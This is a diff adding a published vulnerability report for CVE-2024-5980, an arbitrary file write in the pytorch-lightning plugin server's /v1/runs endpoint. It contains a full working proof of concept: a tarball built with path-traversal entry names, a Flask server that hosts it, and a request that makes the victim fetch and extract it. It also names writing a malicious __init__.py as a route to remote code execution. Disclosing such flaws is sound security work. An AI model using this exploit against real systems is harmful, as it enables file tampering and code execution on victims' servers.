@@ -1,0 +1,77 @@
+Title: Arbitrary File Write via /v1/runs API endpoint in lightning-ai/pytorch-lightning
+
+Proof of Concept: 
+Step 1, the victim has the Python codes plugin.py:
+
+from lightning.app.plugin.plugin import _Run, _start_plugin_server
+
+_start_plugin_server(8888)
+
+and run python3 -m lightning run app plugin.py to start the plugin server in LightningApp.
+
+Step 2, the attacker prepares a malicious_plugin.tar.gz file using the Python codes below makeTar.py:
+
+import tarfile
+
+def change_name(tarinfo):
+    tarinfo.name = "../../../../../tmp/" + tarinfo.name
+    return tarinfo
+
+with tarfile.open("malicious_plugin.tar.gz", "w:gz") as tar:
+    tar.add("hacked", filter=change_name)
+
+and then run a flask server to enable the download of this malicious_plugin.tar.gz using the Python script flask_server.py as follows:
+
+from flask import (Flask, send_file, url_for, jsonify, render_template)
+
+app = Flask(__name__)
+
+@app.route('/malicious_plugin.tar.gz')
+def download():
+    path = 'malicious_plugin.tar.gz'
+    return send_file(path, as_attachment=True)
+
+if __name__ == '__main__':
+    app.run(debug=True, port=8000, host='127.0.0.1')
+
+Step 3, the attacker accesses the victim LightningApp's plugin server to drive it to download and run the Plugins specified by the source_code_url="http://127.0.0.1:8000/malicious_plugin.tar.gz":
+
+from lightning.app.plugin.plugin import _Run
+import requests
+
+body = _Run(
+    plugin_entrypoint="hacked",
+    source_code_url="http://127.0.0.1:8000/malicious_plugin.tar.gz",
+    project_id="any",
+    cloudspace_id="any",
+    cluster_id="any",
+    plugin_arguments={},
+    source_app="any",
+    keep_machines_after_stop=False,
+)
+responses=requests.post('http://127.0.0.1:8888/v1/runs', json=body.dict(exclude_none=True))
+print(responses.content)
+
+Then we can find the malicious hacked file has been created at the victim server's /tmp directory.
+
+Impact: 
+Arbitrary files are written in the victim's local file systems. Many ways lead to RCE such as writing a malicious __init__.py in the Python's /site-packages/ directory.
+
+CVE ID: CVE-2024-5980
+Status: (published)
+Vulnerability Type: CWE-434: Unrestricted Upload of File with Dangerous Type
+Severity: Critical (9.1)
+Attack Vector: Network
+Attack Complexity: Low
+Privileges Required: None
+User Interaction: None
+Scope: Unchanged
+Confidentiality: None
+Integrity: High
+Availability: High
+Registry: Pypi
+Affected Version: v2.2.4
+Visibility: Public
+Status: Fixed
+Disclosure Bounty: $1500
+Fix Bounty: $375
